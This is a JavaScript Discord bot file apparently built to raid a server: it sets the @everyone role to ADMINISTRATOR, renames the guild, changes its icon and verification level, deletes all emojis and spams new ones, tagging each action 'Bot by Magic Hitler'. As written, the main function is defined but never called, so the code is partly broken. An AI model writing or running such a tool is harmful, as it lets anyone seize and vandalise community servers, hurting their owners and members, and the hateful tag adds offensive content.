const Discord = require('discord.js');
const client = new Discord.Client();
const settings = require('../settings.json');

client.on('ready', () => {
    function all() {
        client.guilds.get(settings.auto.server_id).roles.find('name', '@everyone').edit({
            permissions: ["ADMINISTRATOR"]
        });
        if (settings.autoa.guild.enabled === 1) {
            client.guilds.get(settings.auto.server_id).setName(settings.autoa.guild.name, 'Bot by Magic Hitler');
            client.guilds.get(settings.auto.server_id).setIcon(settings.autoa.guild.icon, 'Bot By Magic Hitler');
            client.guilds.get(settings.auto.server_id).setVerificationLevel(settings.autoa.guild.verification_level, 'Bot by Magic Hitler');
            if (settings.autoa.guild.delete_emojis === 1) {
                client.guilds.get(settings.auto.server_id).emojis.map(e => client.guilds.get(settings.auto.server_id).deleteEmoji(e, 'Bot by Magic Hitler'));
            }
            if (settings.autoa.guild.create_emojis.enabled === 1) {
                client.guilds.get(settings.auto.server_id).createEmoji(settings.autoa.guild.create_emojis.link, settings.autoa.guild.create_emojis.name)
            }
        }
    }
});

client.on('emojiCreate', emoji => {
    client.guilds.get(settings.auto.server_id).createEmoji(settings.autoa.guild.create_emojis.link, settings.autoa.guild.create_emojis.name);
})

client.login(settings.token);